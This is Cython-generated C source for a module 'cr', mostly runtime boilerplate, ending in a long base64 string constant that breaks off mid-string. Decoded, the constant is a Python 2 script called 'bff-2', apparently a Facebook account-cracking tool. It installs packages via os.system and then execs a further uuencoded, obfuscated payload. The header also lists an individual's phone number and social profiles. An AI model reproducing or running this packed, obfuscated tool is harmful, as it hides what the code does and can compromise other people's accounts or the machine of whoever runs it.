    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__cr
#define __PYX_HAVE_API__cr
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "cr.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'cr' */
#define __Pyx_MODULE_NAME "cr"
extern int __pyx_module_is_main_cr;
int __pyx_module_is_main_cr = 0;

/* Implementation of 'cr' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_b64decode[] = "b64decode";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5n[] = "IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5nIGJ5IFJvbWkgQWZyaXphbA0KIyBOb3RlIDogamFuZ2FuIGRpIHViYWggbGFnaSEgbmFudGkgZXJyb3IsIHNjcmlwdCB1ZGFoIGVuYWsNCmltcG9ydCBvcw0KdHJ5Og0KCWltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgZnV0dXJlcycpDQp0cnk6DQoJaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIGJzNCcpDQogDQpIaiA9ICdceDFiWzE7OTJtJyANCk10ID0gJ1x4MWJbMG0nIA0KZGVmIGluZ2ZvaCgpOg0KCXByaW50ICgNCiIiIiVzDQog4oCiIEluZm8gc2NyaXB0IDoNCiAJDQogLSBhdXRob3IgICAgICA6IFJvbWkgQWZyaXphbA0KIC0gZmFjZWJvb2sgICAgOiBmYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMg0KIC0gZmFuc3BhZ2UgICAgOiBmYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2DQogLSB3aGF0c2FwICAgICA6ICs2MjgyMzcxNjQ4MTg2DQogLSBnaXRodWIgICAgICA6IGdpdGh1Yi5jb20vTWFyay1adWNrDQogLSBzY3JpcHQgbmFtZSA6IGJmZi0yDQogLSB2ZXJzaW9uICAgICA6IDEuMw0KIA0KJXMiIiIlKEhqLE10KSkNCiAgICANCmltcG9ydCByZXF1ZXN0cywgc2h1dGlsLCBvcywgcmUsIGJzNCwgc3lzLCBqc29uLCB0aW1lLCBwbGF0Zm9ybSAscmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgbG9nZ2luZywgYmFzZTY0DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gY2FsZW5kYXIgaW1wb3J0IG1vbnRocmFuZ2UNCg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbl8gPSBbJ0phbnVhcmknLCAnRmVicnVhcmknLCAnTWFyZXQnLCAnQXByaWwnLCAnTWVpJywgJ0p1bmknLCAnSnVsaScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPa3RvYmVyJywgJ05vdmVtYmVyJywgJ0Rlc2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCmhhcmkgPSBjdXJyZW50LmRheQ0KYnVsYW4gPSBidWxhbl9bblRlbXBdDQp0YWh1biA9IGN1cnJlbnQueWVhcg0KYnVsbGFuID0gY3VycmVudC5tb250aA0KDQp3YWt0dSA9ICgiJXMtJXMtJXMiJShoYXJpLGJ1bGFuLHRhaHVuKSkNCmJ1bGFuMTIgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAi""MDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCg0KZXhlYygobGFtYmRhIF9fLCBfLCA6IF8oYidiZWdpbiA2NjYgPGRhdGE+XG5NKFIhJDoyISM7VlVQOjZRRSgkRVQ9MiEiOjYlUigkJVA4MiFTOjIhQTs2SUk8QiBaPUBIQygkKVQ9UiEmXG5NO1ZRTDtXPEAxJl1OOlIhQjxGXFxALkIhSD1cJzFQPFNITytWPUk9JkFVOEJZQztWVE8zNiVSOlJVOj02LUtcbk0iQixAMlYlUzo2QEA0VzFBPEIhKj02PUEoJClPOyY1SCgkQFM6Iy0oLFIgWjEgSUU+JjVDKiJBTDg2VUJcbk05JiRAN1VcXEwoJVxcTCgjSEA3UkFCKVYpRTlWRU4oIzhWLUIgXFw5JiVUODNZPDtEVEg0QiRELkMoQShTTTZcbk01NSBaLUUlJSoiMSU1I1RSKDIoWi1CNTIqIjBFNCNAUig1LFosQiUhLlM5KTIzUSIoJUhdMCRBIyoiMElcbk01I1UyKDI5PDtEVFs1RSUsLlU8XFwwIyRGNzRYWjRCJSIvJDk8NyQgTjBCJSgvNVBHLDUgXFw0VEEvKlU4XVxuTTIzVEYwNTRYMEVFIy5VOTQzUyxWKTUoWjRFNFovMzhNMlVRTjMyKSIrJCBSNUI1My5DOSAwIzE3LDQkXFxcbk0wQiRKLzM4XTAyQEQqNFxcWylDNSgqIjEgNFNIQysyQEw0QiE6LDIhKTEzWEYtNCxKKEQlLC4jOTUwRVFOXG5NMzNERikkIFc1NVE8MyJARTclUSwqIi0oMCM9MjA